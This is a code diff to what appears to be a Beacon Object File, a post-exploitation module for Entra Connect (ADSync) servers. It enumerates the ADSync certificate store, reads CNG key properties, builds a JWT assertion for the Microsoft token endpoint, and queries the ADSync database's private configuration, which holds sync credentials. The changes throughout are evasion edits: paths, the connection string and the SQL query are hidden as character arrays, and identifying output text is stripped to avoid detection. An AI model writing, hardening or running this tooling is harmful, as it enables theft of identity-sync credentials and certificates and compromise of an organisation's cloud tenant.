-    // ---- Query and display CNG key properties ----
+#ifdef VERBOSE
     {
         WCHAR propBuf[520];
         DWORD propSize = 0;
 
         if (API(NCRYPT, NCryptGetProperty)(hNcryptKey, L"Name", (PBYTE)propBuf, sizeof(propBuf), &propSize, 0) == 0) {
-            BeaconPrintf(CALLBACK_OUTPUT, "[+] CNG Key Name: %ls\n", propBuf);
+            BeaconPrintf(CALLBACK_OUTPUT, "[+] Key Name: %ls\n", propBuf);
         }
         if (API(NCRYPT, NCryptGetProperty)(hNcryptKey, L"Unique Name", (PBYTE)propBuf, sizeof(propBuf), &propSize, 0) == 0) {
-            BeaconPrintf(CALLBACK_OUTPUT, "[+] CNG Unique Name: %ls\n", propBuf);
+            BeaconPrintf(CALLBACK_OUTPUT, "[+] Unique Name: %ls\n", propBuf);
         }
         if (API(NCRYPT, NCryptGetProperty)(hNcryptKey, L"Algorithm Group", (PBYTE)propBuf, sizeof(propBuf), &propSize, 0) == 0) {
-            BeaconPrintf(CALLBACK_OUTPUT, "[+] Algorithm Group: %ls\n", propBuf);
+            BeaconPrintf(CALLBACK_OUTPUT, "[+] Algorithm: %ls\n", propBuf);
         }
         if (API(NCRYPT, NCryptGetProperty)(hNcryptKey, L"Provider Handle", (PBYTE)propBuf, sizeof(propBuf), &propSize, 0) == 0) {
             ULONG_PTR hProv = *(ULONG_PTR*)propBuf;
@@ -966,6 +856,7 @@ void cmd_dumpcert(CONST CHAR* thumbprint, CONST CHAR* client_id, CONST CHAR* ten
             }
         }
     }
+#endif
 
     // ---- Step 6: Build JWT assertion ----
     x5tStr = base64url_encode(thumbBytes, 20);
@@ -987,7 +878,8 @@ void cmd_dumpcert(CONST CHAR* thumbprint, CONST CHAR* client_id, CONST CHAR* ten
     }
 
     CHAR jwtAud[512];
-    API(MSVCRT, _snprintf)(jwtAud, 512, JWT_AUD_FMT, tenant_id);
+    CHAR aFmt[] = { 'h','t','t','p','s',':','/','/','l','o','g','i','n','.','m','i','c','r','o','s','o','f','t','o','n','l','i','n','e','.','c','o','m','/','%','s','/','o','a','u','t','h','2','/','v','2','.','0','/','t','o','k','e','n',0 };
+    API(MSVCRT, _snprintf)(jwtAud, 512, aFmt, tenant_id);
 
     CHAR jwtClaims[JWT_MAX_CLAIMS];
     API(MSVCRT, _snprintf)(jwtClaims, JWT_MAX_CLAIMS,
@@ -1088,12 +980,7 @@ void cmd_version() {
     ENTRACONNECT_VERSION ver = { 0 };
 
     if (!read_entra_version(&ver)) {
-        BeaconPrintf(CALLBACK_ERROR,
-            "Could not find or read Entra Connect / AzureADConnect installation.\n"
-            "Checked:\n"
-            "  C:\\Program Files\\Microsoft Azure Active Directory Connect\\ADSync\\Bin\\ADSync.exe\n"
-            "  C:\\Program Files\\Microsoft Azure Active Directory Connect\\AzureADConnect.exe\n"
-        );
+        BeaconPrintf(CALLBACK_ERROR, "Could not find or read target installation.\n");
         return;
     }
 
@@ -1106,13 +993,13 @@ void cmd_version() {
     API(MSVCRT, sprintf)(verStr, "%d.%d.%d.%d", ver.major, ver.minor, ver.build, ver.revision);
 
     BeaconPrintf(CALLBACK_OUTPUT,
-        "Entra Connect version: %s\n"
+        "Version: %s\n"
         "File: %ls\n"
-        "SQL LocalDB instance: %ls\n"
+        "SQL instance: %ls\n"
         "Auth type: %s\n"
         "Note: %s\n",
         verStr, ver.filePath,
-        sqlInstance ? sqlInstance : L"(not found - check ServiceProfiles\\ADSync LocalDB path)",
+        sqlInstance ? sqlInstance : L"(not found)",
         authType, authNote
     );
 }
@@ -1129,7 +1016,7 @@ void cmd_dumpcertinfo(CONST WCHAR* overrideInstance) {
 
     if (!read_entra_version(&ver)) {
         BeaconPrintf(CALLBACK_ERROR,
-            "Could not find or read Entra Connect installation - cannot determine auth type.\n"
+            "Could not find or read target installation.\n"
         );
         return;
     }
@@ -1139,8 +1026,8 @@ void cmd_dumpcertinfo(CONST WCHAR* overrideInstance) {
 
     if (ver.major < ENTRACONNECT_V2_MAJOR || (ver.major == 2 && ver.minor < ENTRACONNECT_ABA_PREVIEW_MINOR)) {
         BeaconPrintf(CALLBACK_OUTPUT,
-            "Entra Connect version %s does not support Application-Based Authentication.\n"
-            "This installation uses password-based auth only (no certificate/ABA info to extract).\n",
+            "Version %s does not support certificate-based auth.\n"
+            "Password-based auth only (no certificate info to extract).\n",
             verStr
         );
         return;
@@ -1149,17 +1036,18 @@ void cmd_dumpcertinfo(CONST WCHAR* overrideInstance) {
     CONST CHAR* authNote = NULL;
     CONST CHAR* authType = classify_auth_type(&ver, &authNote);
     BeaconPrintf(CALLBACK_OUTPUT,
-        "Entra Connect version %s detected.\n"
+        "Version %s detected.\n"
         "Auth type: %s\n"
-        "Continuing to check for certificate material...\n\n",
+        "Checking for certificate material...\n\n",
         verStr, authType
     );
 
 
-    // --- Enumerate certificate thumbprints from the ADSync certificate store ---
-    // Each file in this directory is named by its SHA-1 thumbprint (40 hex chars).
+    WCHAR wCertDir[] = { 'C',':','\\','W','i','n','d','o','w','s','\\','S','e','r','v','i','c','e','P','r','o','f','i','l','e','s','\\','A','D','S','y','n','c','\\','A','p','p','D','a','t','a','\\','R','o','a','m','i','n','g','\\','M','i','c','r','o','s','o','f','t','\\','S','y','s','t','e','m','C','e','r','t','i','f','i','c','a','t','e','s','\\','M','y','\\','C','e','r','t','i','f','i','c','a','t','e','s',0 };
+    WCHAR wCertDirSearch[] = { 'C',':','\\','W','i','n','d','o','w','s','\\','S','e','r','v','i','c','e','P','r','o','f','i','l','e','s','\\','A','D','S','y','n','c','\\','A','p','p','D','a','t','a','\\','R','o','a','m','i','n','g','\\','M','i','c','r','o','s','o','f','t','\\','S','y','s','t','e','m','C','e','r','t','i','f','i','c','a','t','e','s','\\','M','y','\\','C','e','r','t','i','f','i','c','a','t','e','s','\\','*',0 };
+
     WIN32_FIND_DATAW findData = { 0 };
-    HANDLE hFind = API(KERNEL32, FindFirstFileW)(CERT_DIR_SEARCH, &findData);
+    HANDLE hFind = API(KERNEL32, FindFirstFileW)(wCertDirSearch, &findData);
 
     INT certCount = 0;
 
@@ -1168,7 +1056,7 @@ void cmd_dumpcertinfo(CONST WCHAR* overrideInstance) {
             "[-] No certificates found (or directory inaccessible): %ls\n"
             "    Error: %d\n"
             "    If ABA is configured, certificate material should be present here.\n",
-            CERT_DIR, API(KERNEL32, GetLastError)()
+            wCertDir, API(KERNEL32, GetLastError)()
         );
         goto query_clientid;
     }
@@ -1183,13 +1071,13 @@ void cmd_dumpcertinfo(CONST WCHAR* overrideInstance) {
 
     if (certCount == 0) {
         BeaconPrintf(CALLBACK_ERROR,
-            "[-] No certificates found in ADSync certificate store: %ls\n"
-            "    If ABA is configured, certificate material should be present here.\n",
-            CERT_DIR
+            "[-] No certificates found in target store: %ls\n"
+            "    If certificate auth is configured, material should be present here.\n",
+            wCertDir
         );
     } else if (certCount == 1) {
         // Single cert - green / expected for ABA
-        hFind = API(KERNEL32, FindFirstFileW)(CERT_DIR_SEARCH, &findData);
+        hFind = API(KERNEL32, FindFirstFileW)(wCertDirSearch, &findData);
         // Skip to the non-dot entry
         do {
             if (findData.cFileName[0] != L'.') break;
@@ -1197,21 +1085,21 @@ void cmd_dumpcertinfo(CONST WCHAR* overrideInstance) {
         API(KERNEL32, FindClose)(hFind);
 
         BeaconPrintf(CALLBACK_OUTPUT,
-            "[+] Found 1 certificate in ADSync certificate store (expected for ABA).\n"
+            "[+] Found 1 certificate in target store.\n"
             "    Thumbprint: %ls\n"
             "    Path: %ls\n",
-            findData.cFileName, CERT_DIR
+            findData.cFileName, wCertDir
         );
     } else {
         // Multiple certs - unexpected, raise warning
         BeaconPrintf(CALLBACK_OUTPUT,
-            "[!] WARNING: Found %d certificates in ADSync certificate store - expected 1 for ABA.\n"
-            "    Multiple certificates may indicate a rotation in progress or a misconfiguration.\n"
+            "[!] WARNING: Found %d certificates in target store - expected 1.\n"
+            "    Multiple certificates may indicate rotation or misconfiguration.\n"
             "    Path: %ls\n",
-            certCount, CERT_DIR
+            certCount, wCertDir
         );
 
-        hFind = API(KERNEL32, FindFirstFileW)(CERT_DIR_SEARCH, &findData);
+        hFind = API(KERNEL32, FindFirstFileW)(wCertDirSearch, &findData);
         do {
             if (findData.cFileName[0] == L'.') continue;
             BeaconPrintf(CALLBACK_OUTPUT, "    Thumbprint: %ls\n", findData.cFileName);
@@ -1267,9 +1155,16 @@ query_clientid:
 
     if (!sqlDriverName) { BeaconPrintf(CALLBACK_ERROR, "No suitable ODBC SQL Server driver found.\n"); goto cert_cleanup; }
 
-    sqlConnectionString = BofHeapAlloc((API(MSVCRT, wcslen)(sqlDriverName) + API(MSVCRT, wcslen)(sqlInstanceName)) * sizeof(WCHAR) + sizeof(CONNECTION_STRING_FMT));
-    if (!sqlConnectionString) { BeaconPrintf(CALLBACK_ERROR, "Failed to allocate SQL connection string.\n"); goto cert_cleanup; }
-    API(USER32, wsprintfW)(sqlConnectionString, CONNECTION_STRING_FMT, sqlDriverName, sqlInstanceName);
+    WCHAR wConnFmt[] = { 'D','r','i','v','e','r','=','{','%','l','s','}'
+        ,';','S','e','r','v','e','r','=','(','L','o','c','a','l','D','B',')'
+        ,'\\','.','\\','%','l','s'
+        ,';','D','a','t','a','b','a','s','e','=','A','D','S','y','n','c'
+        ,';','T','r','u','s','t','e','d','_','C','o','n','n','e','c','t','i','o','n','=','y','e','s',0 };
+    SIZE_T connFmtLen = API(MSVCRT, wcslen)(wConnFmt);
+    SIZE_T connStrMaxChars = API(MSVCRT, wcslen)(sqlDriverName) + API(MSVCRT, wcslen)(sqlInstanceName) + connFmtLen + 1;
+    sqlConnectionString = BofHeapAlloc(connStrMaxChars * sizeof(WCHAR));
+    if (!sqlConnectionString) { BeaconPrintf(CALLBACK_ERROR, "Failed to allocate connection string.\n"); goto cert_cleanup; }
+    API(MSVCRT, _snwprintf)(sqlConnectionString, connStrMaxChars, wConnFmt, sqlDriverName, sqlInstanceName);
 
     sqlResult = API(ODBC32, SQLAllocHandle)(SQL_HANDLE_DBC, sqlEnvHandle, &sqlConnHandle);
     if (!IS_SQL_SUCCESS(sqlResult)) { BeaconPrintf(CALLBACK_ERROR, "Failed to allocate SQL connection handle.\n"); goto cert_cleanup; }
@@ -1279,7 +1174,7 @@ query_clientid:
 
     sqlResult = API(ODBC32, SQLDriverConnectW)(sqlConnHandle, NULL, sqlConnectionString, SQL_NTS, NULL, 0, NULL, SQL_DRIVER_NOPROMPT);
     if (!IS_SQL_SUCCESS(sqlResult)) {
-        BeaconPrintf(CALLBACK_ERROR, "Failed to connect to ADSync database. %ls\n", get_last_sql_error(sqlConnHandle, sqlResult));
+        BeaconPrintf(CALLBACK_ERROR, "Failed to connect to database. %ls\n", get_last_sql_error(sqlConnHandle, sqlResult));
         goto cert_cleanup;
     }
     sqlConnected = TRUE;
@@ -1287,7 +1182,8 @@ query_clientid:
     sqlResult = API(ODBC32, SQLAllocHandle)(SQL_HANDLE_STMT, sqlConnHandle, &sqlStmtHandle);
     if (!IS_SQL_SUCCESS(sqlResult)) { BeaconPrintf(CALLBACK_ERROR, "Failed to allocate SQL statement handle.\n"); goto cert_cleanup; }
 
-    sqlResult = API(ODBC32, SQLExecDirectW)(sqlStmtHandle, QUERY_PRIVATE_CONFIG, SQL_NTS);
+    WCHAR wQuery[] = { 'S','E','L','E','C','T',' ','p','r','i','v','a','t','e','_','c','o','n','f','i','g','u','r','a','t','i','o','n','_','x','m','l',' ','F','R','O','M',' ','m','m','s','_','m','a','n','a','g','e','m','e','n','t','_','a','g','e','n','t',';',0 };
+    sqlResult = API(ODBC32, SQLExecDirectW)(sqlStmtHandle, wQuery, SQL_NTS);
     if (!IS_SQL_SUCCESS(sqlResult)) { BeaconPrintf(CALLBACK_ERROR, "Failed to execute private config query.\n"); goto cert_cleanup; }
 
     adSyncPrivateConfig = BofHeapAlloc(CONFIG_SIZE * sizeof(SQLCHAR));
